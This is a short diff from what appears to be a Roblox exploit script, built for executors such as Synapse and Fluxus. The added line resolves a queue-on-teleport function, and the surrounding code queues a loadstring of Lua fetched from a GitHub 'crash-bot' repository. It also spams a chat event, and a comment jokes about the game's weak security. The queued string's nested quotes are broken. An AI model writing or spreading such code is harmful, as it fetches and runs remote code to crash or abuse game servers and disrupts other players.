@@ -73,7 +73,7 @@ local args = {
 }
 
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
-
+queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 queueteleport("loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/crash-bot/refs/heads/main/ggs.luau"))()")
 -- shitty game security lmfao
 local function findGearMachineKeypads()
